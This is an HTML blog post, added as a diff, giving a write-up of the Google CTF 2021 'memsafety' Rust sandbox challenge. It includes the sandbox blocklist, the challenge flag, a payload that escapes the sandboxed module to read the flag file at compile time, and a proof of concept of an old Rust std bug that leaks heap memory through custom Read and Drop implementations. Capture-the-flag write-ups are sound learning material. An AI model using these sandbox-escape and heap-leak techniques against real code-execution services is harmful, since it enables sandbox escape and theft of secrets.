@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <meta name="generator" content="cl-yag" />
+    <title>ᛟYael ~ Google CTF 2021 - Memsaftey</title>
+    <link rel="stylesheet" type="text/css" href="./static/css/style.css" media="screen" />
+    <link rel="alternate" type="application/rss+xml" title="ᛟYael ~ Google CTF 2021 - Memsaftey RSS Feed" href="./rss.xml" />
+    <link rel="alternate" type="application/rss+xml" title="ᛟYael ~ Google CTF 2021 - Memsaftey RSS Feed Gopher" href="./rss-gopher.xml" />
+<!--    <link rel="alternate" type="application/atom+xml" title="ᛟYael ~ Google CTF 2021 - Memsaftey Atom Feed" href="atom.xml" /> -->
+    <link rel="icon" type="image/x-icon" href="static/img/favicon.ico" />
+  </head>
+
+    <body>
+    <div id="wrapper">
+      <main>
+      
+<article id="20230628">
+  <header>
+  
+    <h1><a href="./2023-06-28-memsafety.html">Google CTF 2021 - Memsaftey</a></h1>
+    <p>Written by <em>Yael</em>, on 28 June 2023.<br/>Tags: 
+<span><a href="tag-rust.html">#rust</a></span>
+
+
+<span><a href="tag-ctf.html">#ctf</a></span>
+
+</p>
+  </header>
+  <p>Lately I&#8217;ve been quite busy with IRL stuff and most of my computer stuff has been dedicated to CTF&#8217;s - latest of which was Google CTF 2023. It was a great amount of fun and there are posts in the works about it already~</p>
+
+<p>Although it made me reminscent of an older challange that was presented two years ago in Google CTF 2021: <code>memsafety</code></p>
+
+<h2 id="background">Background</h2>
+
+<p>Going back 2 years ago is quite wild, I was a bored high school barely surviving <em>the pandemic</em>. Back then I was much much less skilled, as it was one of my first ever CTF&#8217;s. Me and <a href="https://tzlil.net">my friend</a> competed and managed to complete around 2&#8211;3 challanges, honestly more than we anticipated and looking back at it was quite impressive &gt;&lt;</p>
+
+<p>This is the story about the most memorable challange we solved.</p>
+
+<h2 id="thechallange">The Challange</h2>
+
+<p>After a small analysis it appears this challange contains three of my favorite things of all times: pwn, sandbox escape and Rust~!</p>
+
+<p>Downloading the attachment archive linked on the website we get several files: a <code>sources/</code> Rust project directory and <code>chal.py</code> script:</p>
+
+<pre><code>├── chal.py
+└── sources
+    ├── Cargo.lock
+    ├── Cargo.toml
+    ├── prelude
+    │   ├── Cargo.toml
+    │   └── src
+    │       └── lib.rs
+    ├── proc-sandbox
+    │   ├── Cargo.toml
+    │   └── src
+    │       └── lib.rs
+    ├── server
+    │   ├── Cargo.toml
+    │   └── src
+    │       └── main.rs
+    ├── user-0
+    │   ├── Cargo.toml
+    │   └── src
+    │       └── lib.rs
+    └── user-1
+        ├── Cargo.toml
+        └── src
+            └── lib.rs
+</code></pre>
+
+<h3 id="thesandbox">The sandbox</h3>
+
+<p>Scary at first but after a deeper look it isn&#8217;t bad at all, let&#8217;s start unpacking the Rust project.
+It seems to be a sandboxing service that pulls programs from <code>user-n/src/lib.rs</code> and runs them with sandbox constraints defined in <code>proc-sandbox/src/lib.rs</code>.</p>
+
+<p>First we should understand what is the sandboxing mechanism. looking at the code it seems to be walking through the AST of our service and denying unsafe expressions, FFI calls, external crate declerations and denial of access to several critical functions and macros. it is being exported as a procedural macro that will later be used on our service functions. On top of that laters we&#8217;ll find that our services run in a non-std enviroment - oomf.</p>
+
+<pre><code class="rust">use proc_macro::TokenStream;
+use quote::ToTokens;
+use syn::visit::Visit;
+use syn::{parse_macro_input, ExprUnsafe, ForeignItem, Ident, Item, ItemExternCrate};
+
+struct Sandbox;
+const BLOCKLIST: &amp;[&amp;str] = &amp;[
+    &quot;env&quot;,
+    &quot;file&quot;,
+    &quot;include&quot;,
+    &quot;include_bytes&quot;,
+    &quot;include_str&quot;,
+    &quot;option_env&quot;,
+    &quot;std&quot;,
+];
+
+impl&lt;'ast&gt; Visit&lt;'ast&gt; for Sandbox {
+    ...
+}
+</code></pre>
+
+<p>Seems to be pretty extensive, let&#8217;s put on our hacker hats and escape the sandbox~
+The server module seems to be pulling services to sandbox from <code>user-0</code> and <code>user-1</code>. the first is a blank program where our code will be probably be stored and the latter reads the flag into the memory.</p>
+
+<p>user&#8211;1/src/lib.rs</p>
+
+<pre><code class="rust">#![no_std]
+use proc_sandbox::sandbox;
+
+#[sandbox]
+pub mod user {
+    static FLAG: &amp;'static str = &quot;CTF{s4ndb0x1n9_s0urc3_1s_h4rd_ev3n_1n_rus7}&quot;;
+    use prelude::{mem::ManuallyDrop, Service, Box, String};
+    pub struct State(ManuallyDrop&lt;String&gt;);
+    impl State {
+        pub fn new() -&gt; Box&lt;dyn Service&gt; {
+            Box::new(State(ManuallyDrop::new(String::from(FLAG))))
+        }
+    }
+    impl Service for State {
+       fn handle(&amp;mut self, _: &amp;str) {}
+    }
+}
+</code></pre>
+
+<p>The way the flag is allocated is incredibly weird though, it uses the <code>ManuallyDrop</code> trait - meaning the flag persists in memory after it gets out of scope (exits the function). This is a huge hint later down the line, perhaps we could leak values off the heap and leak the flag. Anyways, let&#8217;s continue~</p>
+
+<p>In terms of the Rust program we&#8217;re almost done. One last look at how the services get executed:
+Both services get first allocated and only then ran, meaning they&#8217;re all simoustanly in scope and present in memory as they run, this only strengthens the theory we had earlier.</p>
+
+<p>server/src/main.rs</p>
+
+<pre><code class="rust">use prelude::Service;
+fn main() {
+    let mut services: Vec&lt;Box&lt;dyn Service&gt;&gt; = vec![
+        user_0::user::State::new(),
+        user_1::user::State::new(),
+    ];
+    for service in &amp;mut services {
+        service.handle(&quot;test query&quot;);
+    }
+}
+</code></pre>
+
+<h3 id="pythonscript">Python script</h3>
+
+<p>After all of this we&#8217;re still left with mere <code>chal.py</code>, this seems to be the frontend program that is running for us to access.
+It contains quite a lot of complications of it&#8217;s own so let&#8217;s take a deeper look~</p>
+
+<p>The main routine can tell us a lot about each individual component of it:</p>
+
+<pre><code class="py">def main():
+    user_input = get_user_input()
+    write_to_rs(user_input)
+    build_challenge()
+
+    # Check user input after building since the compilation in check_user_input() will
+    # generate errors after generating the ast since the compilation command is
+    # incomplete. Let the proper build run first so users can be presented with any
+    # compilation issues, then validate it before we actually run.
+    check_user_input()
+
+    run_challenge()
+</code></pre>
+
+<p>It first takes our user input, writes it to our rust project (assumingly in <code>user-0/src/lib.rs</code>), builds it, checks the input and then runs the service if it&#8217;s valid.</p>
+
+<p>Two important limitations the app presents is that our code gets written inside a sandboxed service (meaning all of the AST sandboxign applies), and there&#8217;s a check in the <code>check_user_input()</code> for module escaping:</p>
+
+<pre><code class="py">        if len(ast[&quot;module&quot;][&quot;items&quot;]) != 5:
+            socket_print(&quot;Module escaping detected, aborting.&quot;)
+            sys.exit(1)
+</code></pre>
+
+<h2 id="ourunintentedsoltuion">Our Unintented Soltuion</h2>
+
+<p>We were a tad overwhelmed at first although there was something that stuck out like a sore thumb to us, the control flow on the python on script. Why include AST checks in it when you have the rust sandboxing module, and why after you first build the program??? </p>
+
+<p>Scouring through it we found our first vulnerability in the code present in <code>write_to_rs()</code>, it seems to just insert our code into the file without any brackets escpaing checks:</p>
+
+<pre><code class="py">def write_to_rs(contents):
+    socket_print(&quot;Writing source to disk...&quot;)
+    rs_prelude = &quot;&quot;&quot;#![no_std]
+    use proc_sandbox::sandbox;
+
+    #[sandbox]
+    pub mod user {
+        // BEGIN PLAYER REPLACEABLE SECTION
+    &quot;&quot;&quot;.splitlines()
+
+    with open('/home/user/sources/user-0/src/lib.rs', 'w') as fd:
+        fd.write('\n'.join(rs_prelude))
+        fd.write('\n'.join(contents))
+        fd.write(&quot;\n}\n&quot;)
+</code></pre>
+
+<p>this means we can write code that escapes the sandboxed rust module by satisfying the service traint, closing the mod with a bracket and creating our own with an unclosed bracket at the end (which will get appended by the script later)</p>
+
+<pre><code class="rust">    // boilerplate code
+    use prelude::{Box, Service};
+    pub struct State;
+    impl State {
+        pub fn new() -&gt; Box&lt;dyn Service&gt; {
+            Box::new(Self)
+        }
+    }
+    impl Service for State {
+       fn handle(&amp;mut self, _: &amp;str) {}
+    }
+} // close the sandboxed module
+
+// define our own swag module
+mod pwn {
+    // non sandboxed code
+
+// no curly bracket since it will get added
+</code></pre>
+
+<p>As we jumped out of our chairs in glee we referred to the script and understood why the python AST checks were in place, it catches our sneaky module escape since we add an additional module to the namespace.</p>
+
+<p>This was a good start though; looking at the script again the lisp brainrot struck and we remembered something weird, our code gets built before the user checks - this means macros are executed and expanded at will. Combining these two vulnerabilities seems incredibly promising: we could escape out of the sandboxed module and build a macro that will get expanded without any limitations &lt;3</p>
+
+<p>If you&#8217;re a Rust newbie and not sure how to write such macro, worry not as the blocklist will provide a list of relevant functions to leverage :D </p>
+
+<p>Knowing that the flag resides as a static string in the <code>user-1</code> service, we can <code>include_str!</code> it and print it to us using compiler debug options. here&#8217;s our final payload &lt;3</p>
+
+<pre><code class="rust">    // boilerplate code
+    use prelude::{Box, Service};
+    pub struct State;
+    impl State {
+        pub fn new() -&gt; Box&lt;dyn Service&gt; {
+            Box::new(Self)
+        }
+    }
+    impl Service for State {
+       fn handle(&amp;mut self, _: &amp;str) {}
+    }
+} // close the sandboxed module
+
+// define our own swag module
+mod pwn {
+    fn leet() {
+        compile_error!(include_str!(&quot;home/user/sources/user-1/src/lib.rs&quot;));
+    }
+</code></pre>
+
+<h2 id="theintentedsolution-revisitedayearlater">The Intented Solution - Revisited a Year Later</h2>
+
+<p>Our first solution was exciting and worked perfectly for the timespan of the competition - It was obvious the intented solution was leaking the flag from memory, I felt unsatisfied with it and revisited it quite some time later (What about that <code>ManuallyDrop</code>!!!). This time let&#8217;s pwn this Rust program, for real.</p>
+
+<p>The vulnerabilities we found last time are not sufficient here since we&#8217;re anticipating our program to actually get executed in run-time inside the sandbox. I don&#8217;t have much experience in exploiting Rust programs, but since the code doesn&#8217;t use any <code>unsafe</code> blocks it is reasonable to assume the code is <code>safe</code> in theory. IN PRACTICE THOUGH, I would imagine there&#8217;s some compiler bug that would allow us to leak memory somewhere, Rust is a young ambitious language that is being improved upon daily &lt;3</p>
+
+<p>Rushing to check the Rust version it seems the application runs <code>rustc 1.47.0</code>, we can plug that into the Rust compiler repository and look for vulnerabilities to leverage. We need to first revisit our application layout a bit, the flag gets loaded into the heap section waiting to be dropped (which doesn&#8217;t happen till termination) - if we could leak the application&#8217;s heap we should be able to extract it from there~</p>
+
+<p>Combining our established knowledge and the fact this specific version was chosen we can find <a href="https://github.com/rust-lang/rust/pull/80895">Issue #80895</a>. A bug present in the Rust compiler from version 1.20 to 1.50 that can leak the heap using malicious <code>Read</code> and <code>Drop</code> implementations. My understanding of it goes as follows:</p>
+
+<p>We first defined our own &#8220;malicious&#8221; reader that implements the <code>Read</code> trait, in the end will read from the heap. it needs a function that takes mutable buffer and will return the length of bytes we read. The malicious Reader will have 2 states: on the first read it will return an arbrtirary number of bytes we would like to read from the heaps, and on the second one it will stop reading. This may appear weird at first but in conjuction with an uninitialized <code>Vec</code> it is the way to leak our flag :3</p>
+
+<p>Now if we use our reader&#8217;s <code>read_to_end()</code> function on the unitnialized vector it will trick the compiler and change the vector&#8217;s buffer size. It is possible to access the vector after this method by implementing the <code>Drop</code> trait that will activate whenever it needs to be deallocated (which happens after it is deemed to be read and the malicious modification of it&#8217;s length), there the access to the heap is ours &gt;:3</p>
+
+<p>Here&#8217;s a POC for it:</p>
+
+<pre><code class="rust">#![forbid(unsafe_code)]
+
+use std::io::Read;
+
+struct PwnRead {
+    first: bool,
+}
+
+impl PwnRead {
+    pub fn new() -&gt; Self {
+        PwnRead { first: false }
+    }
+}
+
+impl Read for PwnRead {
+    fn read(&amp;mut self, _buf: &amp;mut [u8]) -&gt; std::io::Result&lt;usize&gt; {
+        if !self.first {
+            self.first = true;
+            // First state: return more than the buffer size
+            Ok(200)
+        } else {
+            // Second state: we are done &gt;:3
+            Ok(0)
+        }
+    }
+}
+
+struct VecHeapWrapper {
+    inner: Vec&lt;u8&gt;,
+}
+
+impl VecHeapWrapper {
+    pub fn new() -&gt; Self {
+        VecHeapWrapper { inner: Vec::new() }
+    }
+}
+
+impl Drop for VecHeapWrapper {
+    fn drop(&amp;mut self) {
+        // Leak heap !!!!
+        // Buffer size has changed to whatever is dictated by the reader
+        println!(&quot;{:?}&quot;, &amp;self.inner);
+    }
+}
+
+fn main() {
+    let mut vec = VecHeapWrapper::new();
+    let mut read = PwnRead::new();
+    read.read_to_end(&amp;mut vec.inner).unwrap();
+}
+</code></pre>
+
+<p>This is by no means an exhaustive look on this bug or any Rust bugs in general, so please read more about it on the GitHub if it is of interest.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p><strong>WOW</strong> what a challenge~</p>
+
+<p>It is maybe not your average C Linux pwn, but it still taught me so much. I endlessly enjoyed the multiple deep ways you can solve it, only deepening my knowledge with each approach. The techniques used in both solutions are not straightforward at all, although they&#8217;re super fun and not too difficult to catch even under a timeconstraint.</p>
+
+<p>Furthermore, I&#8217;m super psyched I chose to return to it and finish it &#8220;properly&#8221;. It taught me so much and only gave validation for the first approach we took.</p>
+
+<p>I really hope you enjoyed reading as much as I enjoyed writing, thank you so much for reaching thus far~ &lt;3</p>
+
+</article>
+
+
+      </main>
+
+      <footer><p>This blog is powered by cl-yag~</p></footer>
+
+    </div><!-- #wrapper -->
+  </body>
+</html>
